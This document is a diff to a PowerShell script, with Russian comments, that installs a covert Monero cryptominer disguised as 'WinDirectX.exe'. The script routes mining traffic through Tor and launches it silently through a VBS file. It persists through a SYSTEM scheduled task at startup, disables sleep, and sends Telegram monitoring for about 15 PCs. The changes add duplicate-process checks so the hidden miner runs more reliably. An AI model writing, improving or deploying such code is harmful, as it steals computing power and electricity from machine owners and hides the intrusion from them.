@@ -89,19 +89,21 @@ if (!(Test-Path "$path\tor.exe")) {
 }
 
 
-
-# 6. СОЗДАНИЕ ТИХОГО ЗАПУСКА (ДВОЙНОЙ ЗАПУСК ИЗ VBS)
-# 6a. Создаем BAT-файл (только для майнера)
+# 6. СОЗДАНИЕ ТИХОГО ЗАПУСКА (С ЗАЩИТОЙ ОТ ДУБЛЕЙ)
+# 6a. Создаем BAT-файл с проверкой запущенного процесса
 $cmd = "@echo off`n" +
+       "tasklist /FI `"IMAGENAME eq WinDirectX.exe`" 2>NUL | find /I /N `"WinDirectX.exe`">NUL`n" +
+       "if %ERRORLEVEL%==0 exit`n" + # Если майнер уже есть — выходим
        "timeout /t 15 /nobreak >nul`n" +
        "start /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $env:COMPUTERNAME --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6"
 $cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
 
-# 6b. Создаем VBS, который запускает сначала TOR, а потом БАТНИК
+# 6b. Создаем VBS
 $vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`n" +
        "WshShell.Run `"$path\tor.exe`", 0, False`n" +
        "WshShell.Run `"$path\run_cache.bat`", 0, False"
 $vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii
+
 
 
 
@@ -113,11 +115,19 @@ $TaskTrigger = New-ScheduledTaskTrigger -AtStartup
 $TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
 Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -User "SYSTEM" -RunLevel Highest -Force
 
-# 7. ПИТАНИЕ И СТАРТ
+# 7. ПИТАНИЕ И УМНЫЙ СТАРТ
 powercfg /x -hibernate-timeout-ac 0
 powercfg /x -monitor-timeout-ac 5
 powercfg /x -standby-timeout-ac 0
-Start-Process -FilePath "$path\win_start.vbs"
+
+# Запускаем только если майнер еще НЕ запущен
+if (!(Get-Process "WinDirectX" -ErrorAction SilentlyContinue)) {
+    Start-Process -FilePath "$path\win_start.vbs"
+    Write-Host "🚀 Майнер запущен впервые." -ForegroundColor Green
+} else {
+    Write-Host "✅ Майнер уже работает, повторный запуск не требуется." -ForegroundColor Yellow
+}
+
 
 # 8. МОНИТОРИНГ В ТЕЛЕГРАМ (ОПТИМИЗИРОВАНО ПОД 15 ПК)
 $Monitor = {
